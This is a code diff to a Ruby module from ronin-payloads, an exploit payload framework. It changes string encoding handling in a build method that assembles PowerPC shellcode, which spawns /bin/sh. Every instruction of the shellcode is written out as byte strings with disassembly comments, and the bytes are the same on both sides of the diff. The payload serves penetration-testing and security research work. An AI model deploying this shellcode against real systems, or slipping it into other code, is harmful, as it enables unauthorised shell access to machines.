@@ -1,3 +1,4 @@
+# encoding: ASCII-8BIT
 # frozen_string_literal: true
 #
 # ronin-payloads - A Ruby micro-framework for writing and running exploit
@@ -51,20 +52,20 @@ module Ronin
             # Builds the shellcode.
             #
             def build
-              @payload = "\x7c\x3f\x0b\x78".b + # mr	r31,r1
-                         "\x7c\xa5\x2a\x79".b + # xor.	r5,r5,r5
-                         "\x42\x40\xff\xf9".b + # bdzl+	10000454< main>
-                         "\x7f\x08\x02\xa6".b + # mflr	r24
-                         "\x3b\x18\x01\x34".b + # addi	r24,r24,308
-                         "\x98\xb8\xfe\xfb".b + # stb	r5,-261(r24)
-                         "\x38\x78\xfe\xf4".b + # addi	r3,r24,-268
-                         "\x90\x61\xff\xf8".b + # stw	r3,-8(r1)
-                         "\x38\x81\xff\xf8".b + # addi	r4,r1,-8
-                         "\x90\xa1\xff\xfc".b + # stw	r5,-4(r1)
-                         "\x3b\xc0\x01\x60".b + # li	r30,352
-                         "\x7f\xc0\x2e\x70".b + # srawi	r0,r30,5
-                         "\x44\xde\xad\xf2".b + # .long	0x44deadf2
-                         "/bin/shZ".b  # the last byte becomes NULL
+              @payload = "\x7c\x3f\x0b\x78" + # mr	r31,r1
+                         "\x7c\xa5\x2a\x79" + # xor.	r5,r5,r5
+                         "\x42\x40\xff\xf9" + # bdzl+	10000454< main>
+                         "\x7f\x08\x02\xa6" + # mflr	r24
+                         "\x3b\x18\x01\x34" + # addi	r24,r24,308
+                         "\x98\xb8\xfe\xfb" + # stb	r5,-261(r24)
+                         "\x38\x78\xfe\xf4" + # addi	r3,r24,-268
+                         "\x90\x61\xff\xf8" + # stw	r3,-8(r1)
+                         "\x38\x81\xff\xf8" + # addi	r4,r1,-8
+                         "\x90\xa1\xff\xfc" + # stw	r5,-4(r1)
+                         "\x3b\xc0\x01\x60" + # li	r30,352
+                         "\x7f\xc0\x2e\x70" + # srawi	r0,r30,5
+                         "\x44\xde\xad\xf2" + # .long	0x44deadf2
+                         "/bin/shZ"  # the last byte becomes NULL
             end
 
           end
